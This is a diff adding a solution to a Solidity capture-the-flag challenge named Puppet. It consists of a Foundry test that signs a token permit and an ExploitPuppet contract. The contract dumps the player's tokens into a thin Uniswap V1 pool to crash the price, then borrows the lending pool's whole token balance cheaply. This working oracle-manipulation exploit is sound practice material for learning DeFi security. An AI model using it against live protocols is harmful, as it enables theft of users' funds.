@@ -92,7 +92,29 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
+        // Prepare Signature to Permit
+            address computedAddress =  vm.computeCreateAddress(player,0);
+            bytes32 permitHash = keccak256(
+                abi.encodePacked(
+                    "\x19\x01",
+                    token.DOMAIN_SEPARATOR(),
+                    keccak256(
+                        abi.encode(
+                            keccak256(
+                                "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
+                            ),
+                            player, computedAddress, PLAYER_INITIAL_TOKEN_BALANCE, token.nonces(player), block.timestamp + 1 days
+                        )
+                    )
+                )
+            );
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, permitHash);
+            bytes memory permitParams = abi.encodeCall( 
+            token.permit, (player, computedAddress, PLAYER_INITIAL_TOKEN_BALANCE, block.timestamp + 1 days, v, r, s));
         
+        // Deploy Exploit contract
+            new ExploitPuppet{value: 10e18}(token, uniswapV1Exchange, lendingPool, recovery, permitParams);
+
     }
 
     // Utility function to calculate Uniswap prices
@@ -114,5 +136,24 @@ contract PuppetChallenge is Test {
         // All tokens of the lending pool were deposited into the recovery account
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract ExploitPuppet{
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
+    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+
+    constructor(DamnValuableToken token, IUniswapV1Exchange uniswapV1Exchange, PuppetPool lendingPool, address recovery, bytes memory permitParams) payable{
+        (bool success, bytes memory data)  =  address(token).call(permitParams);
+        require(success, "Failed to permit");
+        token.transferFrom(msg.sender, address(this), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        token.approve(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE);
+        uint256 outETH = uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1e18, block.timestamp + 1 days );
+        
+        lendingPool.borrow{value:  10e18 + outETH}(POOL_INITIAL_TOKEN_BALANCE, recovery); 
     }
 }
